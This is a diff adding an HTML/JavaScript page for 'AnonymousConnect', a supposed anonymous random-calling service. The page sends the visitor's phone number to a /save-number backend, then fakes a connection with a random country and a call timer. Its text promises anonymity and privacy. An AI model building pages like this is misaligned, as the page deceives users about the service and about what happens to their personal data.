@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anonymous Random Call - Connect Globally</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #1a2a6c, #b21f1f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tagline {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        input[type="tel"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        input[type="tel"]:focus {
+            border-color: #1a2a6c;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 42, 108, 0.2);
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #1a2a6c, #b21f1f);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .info-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #1a2a6c;
+            padding: 15px;
+            margin-top: 30px;
+            text-align: left;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .info-box h3 {
+            color: #1a2a6c;
+            margin-bottom: 10px;
+        }
+
+        .info-box ul {
+            padding-left: 20px;
+        }
+
+        .info-box li {
+            margin-bottom: 8px;
+            color: #555;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .status.connecting {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+
+        .status.connected {
+            background-color: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .call-controls {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .call-btn {
+            padding: 12px 25px;
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            margin: 0 10px;
+            font-size: 1.5rem;
+            border: none;
+            cursor: pointer;
+        }
+
+        .call-btn.accept {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .call-btn.reject {
+            background-color: #dc3545;
+            color: white;
+        }
+
+        .timer {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #1a2a6c;
+        }
+
+        .footer {
+            margin-top: 30px;
+            color: #777;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="logo">AnonymousConnect</h1>
+        <p class="tagline">Talk to random people from around the world anonymously</p>
+
+        <form id="phoneForm">
+            <div class="form-group">
+                <label for="phoneNumber">Enter Your Phone Number</label>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="+1 (555) 123-4567" required>
+            </div>
+
+            <button type="submit" class="btn">Connect Randomly</button>
+        </form>
+
+        <div id="status" class="status"></div>
+
+        <div id="callControls" class="call-controls">
+            <div class="timer" id="timer">00:00</div>
+            <button class="call-btn reject" id="endCall">⏹️</button>
+        </div>
+
+        <div class="info-box">
+            <h3>How it works:</h3>
+            <ul>
+                <li>Enter your phone number in international format</li>
+                <li>Click "Connect Randomly" to be matched with a stranger</li>
+                <li>Talk anonymously - no personal information is shared</li>
+                <li>Hang up anytime to end the conversation</li>
+                <li>Your privacy is our priority</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <p>By using this service, you agree to our Terms of Service and Privacy Policy</p>
+            <p>© 2023 AnonymousConnect. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const statusDiv = document.getElementById('status');
+
+            // Validate phone number
+            if (!isValidPhoneNumber(phoneNumber)) {
+                statusDiv.textContent = "Please enter a valid phone number in international format (e.g., +1234567890)";
+                statusDiv.className = "status connecting";
+                statusDiv.style.display = "block";
+                return;
+            }
+
+            // Show connecting status
+            statusDiv.textContent = "Connecting you with a random person...";
+            statusDiv.className = "status connecting";
+            statusDiv.style.display = "block";
+
+            // Send data to backend
+            fetch('/save-number', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `phoneNumber=${encodeURIComponent(phoneNumber)}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Simulate connection process
+                    setTimeout(() => {
+                        statusDiv.textContent = "Connected! You're now talking to someone from " + getRandomCountry();
+                        statusDiv.className = "status connected";
+                        document.getElementById('callControls').style.display = "block";
+                        startTimer();
+                    }, 3000);
+                } else {
+                    statusDiv.textContent = "Error connecting. Please try again.";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                statusDiv.textContent = "Error connecting. Please try again.";
+            });
+        });
+
+        document.getElementById('endCall').addEventListener('click', function() {
+            document.getElementById('status').textContent = "Call ended. Enter a new number to connect again.";
+            document.getElementById('status').className = "status connecting";
+            document.getElementById('callControls').style.display = "none";
+            resetTimer();
+        });
+
+        function isValidPhoneNumber(phone) {
+            // Simple international phone number validation
+            const phoneRegex = /^\+\d{1,3}\d{7,14}$/;
+            return phoneRegex.test(phone.replace(/\s/g, ''));
+        }
+
+        function getRandomCountry() {
+            const countries = [
+                "United States", "United Kingdom", "Canada", "Australia",
+                "Germany", "France", "Japan", "Brazil", "India", "South Africa",
+                "Mexico", "Italy", "Spain", "South Korea", "Nigeria"
+            ];
+            return countries[Math.floor(Math.random() * countries.length)];
+        }
+
+        let timerInterval;
+        let seconds = 0;
+
+        function startTimer() {
+            resetTimer();
+            timerInterval = setInterval(() => {
+                seconds++;
+                const minutes = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                document.getElementById('timer').textContent =
+                    `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        function resetTimer() {
+            clearInterval(timerInterval);
+            seconds = 0;
+            document.getElementById('timer').textContent = "00:00";
+        }
+    </script>
+</body>
+</html>
